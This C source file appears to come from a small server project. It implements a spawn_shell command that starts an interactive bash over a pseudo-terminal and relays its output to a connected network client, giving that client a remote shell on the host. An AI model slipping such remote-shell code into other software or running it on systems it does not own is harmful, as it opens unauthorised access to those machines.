#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>
#include <pty.h>
#include <poll.h>

#include "server.h"

static void *monitor_shell_output(void *arg)
{
    t_client *client = (t_client *)arg;
    char buffer[CHAR_BUFFER];
    struct pollfd fds[1];

    fds[0].fd = client->shell_fd;
    fds[0].events = POLLIN;

    while (client->shell_active)
    {
        pthread_testcancel();

        int ret = poll(fds, 1, 1000);
        if (ret == -1)
        {
            if (errno == EINTR)
                continue;
            break;
        }
        else if (ret == 0)
            continue;

        ssize_t bytes_read = read(client->shell_fd, buffer, sizeof(buffer));
        if (bytes_read > 0)
        {
            ssize_t total_sent = 0;
            while (total_sent < bytes_read)
            {
                ssize_t sent = send(client->socket_fd, buffer + total_sent, bytes_read - total_sent, MSG_NOSIGNAL);
                if (sent < 0)
                {
                    if (errno == EAGAIN || errno == EWOULDBLOCK)
                    {
                        usleep(10000);
                        continue;
                    }
                    client->shell_active = false;
                    break;
                }
                total_sent += sent;
            }
        }
        else if (bytes_read == 0 || (bytes_read < 0 && errno != EAGAIN))
        {
            client->shell_active = false;
            break;
        }
    }

    pthread_exit(NULL);
}

void spawn_shell(t_client *client)
{
    pid_t pid;
    int master_fd;

    pid = forkpty(&master_fd, NULL, NULL, NULL);
    if (pid < 0)
    {
        send_message(client->socket_fd, "Failed to fork with pty\n");
        return;
    }

    if (pid == 0)
    {
        setenv("TERM", "xterm-256color", 1);
        setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
        setenv("PS1", "$USER@$USER:~$PWD$ ", 1);

        execlp("sh", "sh", "-c", "stty raw -echo; exec bash --norc --noprofile -i", NULL);
        exit(EXIT_FAILURE);
    }
    else
    {
        client->shell_pid = pid;
        client->shell_fd = master_fd;
        fcntl(master_fd, F_SETFL, O_NONBLOCK);

        client->shell_active = true;
        pthread_create(&client->output_thread, NULL, monitor_shell_output, client);
    }
}

void help(t_client *client)
{
    send_message(client->socket_fd, "Available commands:\n");
    send_message(client->socket_fd, "\tspawn_shell - Spawn a shell\n");
    send_message(client->socket_fd, "\texit - Exit\n");
    send_message(client->socket_fd, "\thelp - Display this help message\n");
}
